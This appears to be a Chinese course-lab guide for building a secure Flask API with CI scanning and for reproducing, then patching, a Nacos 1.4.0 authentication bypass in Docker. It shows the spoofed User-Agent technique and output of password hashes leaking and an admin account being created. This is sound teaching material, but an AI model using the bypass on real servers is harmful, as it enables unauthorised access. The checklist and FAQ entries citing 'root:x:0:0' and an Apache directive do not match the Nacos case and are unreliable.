# 实验 1 完成指南（按步骤）

这份指南把你需要亲手做的部分串成一条线。凡是标 **✅ 已完成** 的，仓库里已经有了；
标 **👉 你来做** 的，需要你在自己的机器 / 浏览器里点几下。

预计用时：本机部分 15 分钟，Docker + CVE 部分 30–40 分钟。

> 全部做完后，按 **[提交清单](SUBMISSION.md)** 逐条自查。

---

## 阶段 0 — 先确认仓库能跑

**✅ 已完成**：API 代码、84 个测试、CI 配置、CVE 环境与脚本、中英文 README 与报告。

**👉 你来做**：

```powershell
cd "C:\Users\ryz20\OneDrive\文档\deepseek-harness\default-workspace\lab1-secure-api"

# 1. 装依赖（若已装过 flask/pytest 可跳过）
pip install -r requirements-dev.txt

# 2. 跑测试，应该是 84 passed
python -m pytest -q

# 3. 起服务
python run.py
```

另开一个终端：

```powershell
powershell -ExecutionPolicy Bypass -File .\scripts\demo.ps1
```

> Windows PowerShell 默认执行策略是 Restricted，直接 `.\scripts\demo.ps1` 会报
> “未数字签名”。上面这行只对本次进程放行；也可以先 `Set-ExecutionPolicy -Scope Process Bypass`。

预期看到 9 个步骤全部 `[PASS]`，最后一行 `All steps finished.`。
**截图** → 存成 `docs\screenshots\api-demo.png`（可选，但报告里好加分）。

---

## 阶段 1 — 建 GitHub 仓库并 push

**👉 你来做**：

1. 在 GitHub 上新建一个 **public** 仓库，名字建议 `lab1-secure-api`，
   **不要**勾选 "Add a README / .gitignore / license"（本地已经有了）。

2. 在本项目目录里：

```powershell
git remote add origin https://github.com/RyzLLL/-Information-Security-Lab1.git
git branch -M main
git push -u origin main
```

3. 如果提示要凭据：用 **Personal Access Token** 当密码
   （GitHub → Settings → Developer settings → Personal access tokens → Fine-grained，
   勾 `Contents: Read and write`）。不要使用账号密码。

4. 把下面三处 `RyzLLL/-Information-Security-Lab1` 替换成你的实际地址：

   - `README.md` / `README.zh-CN.md` 顶部的 badge 和链接
   - `docs/report_en.md` / `docs/report_zh.md` 首页的仓库地址与流水线地址

```powershell
git add -A
git commit -m "docs: point links at the real repository"
git push
```

---

## 阶段 2 — 看 CI 跑起来，截图

push 之后去 `https://github.com/RyzLLL/-Information-Security-Lab1/actions`：

| 要截的图 | 怎么截 | 存成 |
|---|---|---|
| 四个 job 全绿（test / lint / Bandit / pip-audit） | Actions → CI → 最近一次运行，截 job 列表 | `docs/screenshots/ci-green.png` |
| Bandit 报告 | 点进 **SAST - Bandit** → 页面底部 **Summary** 里有报告文本 | `docs/screenshots/bandit.png` |
| pip-audit 报告 | 点进 **SCA - pip-audit** → **Summary**（应显示 `No known vulnerabilities found`） | `docs/screenshots/pip-audit.png` |

> 如果 Bandit 报出问题：点开看 `Issue: [B1xx] ...` 的说明，按提示改代码后重新 push。
> 如果 pip-audit 报依赖漏洞：升级 `requirements.txt` 里对应的版本后重新 push。
>
> 把最后成功的这次运行的 URL 填进报告首页的 *Pipeline* 一行。

---

## 阶段 3 — 装 Docker Desktop（只做一次）

**👉 你来做**（需要管理员权限 + 一次重启）：

1. 下载：<https://www.docker.com/products/docker-desktop/> → **Download for Windows**。
2. 双击安装，勾选 **Use WSL 2 instead of Hyper-V**（推荐）。
3. 如果提示 WSL 未安装，在**管理员** PowerShell 里执行：

```powershell
wsl --install
```

   然后**重启**。

4. 重启后打开 Docker Desktop，等左下角变成 **Engine running**。
5. 验证（普通 PowerShell 窗口）：

```powershell
docker --version
docker compose version
docker run --rm hello-world
```

   看到 `Hello from Docker!` 就成了。

> 装不上时（`wsl --install` 返回 403、DISM 被策略锁住等）常见解法：
> 用 DISM 离线启用 `VirtualMachinePlatform`，重启后从 GitHub releases 装 WSL 的 MSI，
> 最后 `winget install --exact --id Docker.DockerDesktop`（本机就是这么装通的）。

---


## 阶段 4 — 启动漏洞环境并复现 CVE

**✅ 已完成**：`cve/Dockerfile`、`cve/docker-compose.yml`、利用脚本、验证脚本。

**👉 你来做**——一条命令跑完阶段 4 和阶段 5：

```powershell
cd .\cve
powershell -ExecutionPolicy Bypass -File .\run-all.ps1
```

它会依次：起 Nacos 1.4.0 → 打 → 关 → 起修复版 1.4.1 → 重放并断言失败 → 关，
把两份原始输出写到 `cve\evidence\`，最后打印 SUMMARY。
**只有"漏洞版确实被打穿"且"修复版确实全部拒绝"时才 exit 0**。

下面是等价的**手动**步骤，适合一步步截图：

```powershell
cd .\cve
docker compose up -d --build          # 首次会下载 Nacos 1.4.0 发行包（约 100 MB）
docker compose ps                     # 状态应为 Up
curl.exe -s -o NUL -w "%{http_code}`n" http://127.0.0.1:8848/nacos/   # 200
```

> Nacos 是 Spring Boot 应用，`up` 之后要等 **30–60 秒**才能访问。

复现攻击：

```powershell
powershell -ExecutionPolicy Bypass -File .\exploit.ps1
```

预期看到：

```
2. Baseline: GET /nacos/v1/auth/users without credentials
HTTP 403
{"status":403,"error":"Forbidden","message":"unknown user!"}

3. Bypass: same request with 'User-Agent: Nacos-Server'
HTTP 200
{"totalCount":1,...,"pageItems":[{"username":"nacos","password":"$2a$10$..."}]}
>>> VULNERABLE: authentication bypassed; the user table and password hashes are readable.

4. Impact: create an admin account through the same bypass
{"code":200,"message":"create user ok!","data":null}
>>> VULNERABLE: 'pwned4779' was created without any credentials
```

**截图** → `docs\screenshots\cve-exploit.png`（要包含 403 基线、200 泄露、`create user ok!`）

---

## 阶段 5 — 打补丁并验证

```powershell
docker compose down
docker compose -f docker-compose.fixed.yml up -d --build
powershell -ExecutionPolicy Bypass -File .\verify-fix.ps1
```

预期全部 `[PASS]`，最后一行：

```
RESULT: fix verified -- all checks passed.
```

**截图** → `docs\screenshots\cve-fixed.png`（要包含 `HTTP 403` 和 `RESULT: fix verified`）

> 修复不只是"升到 1.4.1"：1.4.1 只是引入 `userAgentAuthWhite` 开关且默认开着，
> 还得把它关掉并配一对 server identity。细节见 `cve/README.md` 第 6 节。

整理容器：

```powershell
docker compose -f docker-compose.fixed.yml down
```

---

## 阶段 6 — 报告与截图（已完成）

首页信息、5 张截图、PDF 都已经做好，**不需要再改**：

| 项 | 状态 |
|---|---|
| 封面 | 姓名「戎彦哲」、学号 23320120 已填（变体号一栏已按要求删除） |
| 截图 | `docs/screenshots/` 下 5 张齐全，PDF 内已嵌入，无虚线框 |
| PDF | `docs/report_zh.pdf` / `report_en.pdf` |

只有改了 Markdown 之后才需要重新生成：

```powershell
python scripts\build_report.py --pdf
```

> 脚本自动找 Edge/Chrome 无头打印；找不到浏览器时会提示你手动打开 HTML 按 `Ctrl+P`。

---

## 阶段 7 — 提交

| # | 提交物 | 在哪 |
|---|---|---|
| 1 | 公开仓库链接 | `https://github.com/RyzLLL/-Information-Security-Lab1` |
| 2 | README.md 内容 | 仓库根目录（含截图） |
| 3 | 最近一次成功流水线链接 | `https://github.com/RyzLLL/-Information-Security-Lab1/actions` |
| 4 | 修复文件目录 | `cve/Dockerfile.fixed` + `cve/docker-compose.fixed.yml`（也可以打包 `cve/` 整个目录） |
| 5 | 实验报告 | `docs/report_zh.pdf` / `docs/report_en.pdf` |

---

## 自查：得分点对照

- [ ] 2 分 — 三个接口都能通（`demo.ps1` 9 项 PASS）
- [ ] 0.5 分 — SQLi 防护有代码 + 有用例（`tests/test_sqli_xss.py`）
- [ ] 0.5 分 — XSS 防护有代码 + 有用例
- [ ] 1 分 — JWT + bcrypt 都能演示（401 无令牌 / 200 有令牌 / 伪造令牌被拒）
- [ ] 2 分 — CI 有 Bandit + pip-audit，且截图能看到报告
- [ ] 2 分 — `root:x:0:0` 截图（CVE 复现成功）
- [ ] 1 分 — 报告 4.3 节根因分析（信任请求头、认证开关的前提、1.4.1 为何还不够）
- [ ] 1 分 — 修复后 400 + 回归通过截图

## 常见问题

**Q：`docker compose up` 卡在 pull？**
配镜像加速（Docker Desktop → Settings → Docker Engine 加 `registry-mirrors`），或换网络重试。

**Q：端口 8848 被占用？**
改 `cve/docker-compose.yml` 里的 `"8848:8848"` 为 `"8849:8848"`，脚本加 `-Target http://127.0.0.1:8849`。

**Q：`exploit.ps1` 报 403 而不是 200？**
说明 `<Directory /> Require all granted` 没生效（镜像没重新 build）。`docker compose up -d --build --force-recreate`。

**Q：CI 的 Bandit 报 B105（hardcode password）？**
大概率是 `app/db.py` 里的种子口令。那不是秘密，但更干净的做法是把演示口令改成
从环境变量读取；或者在该行加 `# nosec B105` 并写清理由（评分看的是你有没有解释）。
